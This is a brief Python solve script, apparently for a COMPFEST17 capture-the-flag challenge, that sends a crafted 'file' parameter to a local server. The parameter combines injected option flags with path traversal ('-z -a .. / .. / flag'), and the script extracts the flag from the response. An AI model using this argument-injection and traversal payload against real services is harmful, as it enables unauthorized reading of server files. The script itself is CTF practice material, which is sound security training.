import requests
from urllib.parse import quote
import re

TARGET = "http://localhost:3000/?file="

payload = "-z -a .. / .. / flag"
r = requests.get(TARGET + quote(payload))

search = re.search("COMPFEST17{.+}", r.text)

if search:
    print(search.group(0))
else:
    print("Flag not found")

